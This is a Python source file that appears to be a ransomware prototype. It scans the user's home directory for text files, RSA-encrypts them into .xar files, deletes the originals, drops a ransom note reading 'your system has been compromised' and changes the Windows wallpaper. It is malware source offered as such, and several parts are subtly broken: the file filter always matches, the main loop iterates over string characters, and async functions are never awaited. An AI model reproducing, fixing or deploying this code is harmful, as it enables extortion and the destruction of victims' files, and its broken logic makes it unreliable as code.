import os
import ctypes

import rsa

class encryption:

    @staticmethod
    def generateKeys():
        (publicKey, privateKey) = rsa.newkeys(1024)
        with open('pubkey.pem', 'wb') as p:
            p.write(publicKey.save_pkcs1('PEM'))
        with open('privkey.pem', 'wb') as p:
            p.write(privateKey.save_pkcs1('PEM'))

    @staticmethod
    def loadKeys():
        with open('pubkey.pem', 'rb') as p:
            publicKey = rsa.PublicKey.load_pkcs1(p.read())
        with open('privkey.pem', 'rb') as p:
            privateKey = rsa.PrivateKey.load_pkcs1(p.read())
        return privateKey, publicKey

    def encrypt_file(file_path, publicKey):
        with open(file_path, 'rb') as file:
            file_content = file.read()
            encrypted_content = rsa.encrypt(file_content, publicKey)
        with open(file_path + '.xar', 'wb') as encrypted_file:
            encrypted_file.write(encrypted_content)

    def sign_file(file_path, privateKey):
        with open(file_path, 'rb') as file:
            file_content = file.read()
            signature = rsa.sign(file_content, privateKey, 'SHA-256')
        with open(file_path + '.sig', 'wb') as signature_file:
            signature_file.write(signature)

def list():
    global fs_paths

    inc_exs = [".txt"]
    
    fs_paths = []
    for root, dirs, files in os.walk(os.path.expanduser("~")):
        try:
            dirs[:] = [d for d in dirs if any(file.endswith(tuple(inc_exs)) for file in os.listdir(os.path.join(root, d)))]
            for file in files:
                if file.endswith(tuple(inc_exs)) and os.path.abspath(os.path.join(root, file)) != os.path.abspath(__file__) and not file.endswith(".xar") or (".pem"):
                    fs_paths.append(os.path.join(root, file))
                f = open("paths.pem", "w")
                f.write(str(fs_paths))
                f.close()
        except PermissionError or NotADirectoryError as x:
                print(f"error: {x}")
                continue
    return fs_paths

async def set_wallpaper():
    global img_p
    SPI_SETDESKWALLPAPER = 20
    img_p = os.path.join(os.getcwd(), "download.jpg")
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, img_p, 3)

async def write_ransom():
    with open("READMEREADME.pem", "w") as r:
        r.write("your system has been compromised")
        r.close()

def main():
    global file_path
    encryption.generateKeys()
    privateKey, publicKey = encryption.loadKeys()
    list()
    with open("paths.pem", "r") as f:
        fs_paths = f.read()
        f.close()
    for file_path in fs_paths:
        encryption.encrypt_file(file_path, publicKey)
        encryption.sign_file(file_path, privateKey)
        os.unlink(str(file_path.strip()))
        write_ransom()
        set_wallpaper()

if __name__ == "__main__":
    main()

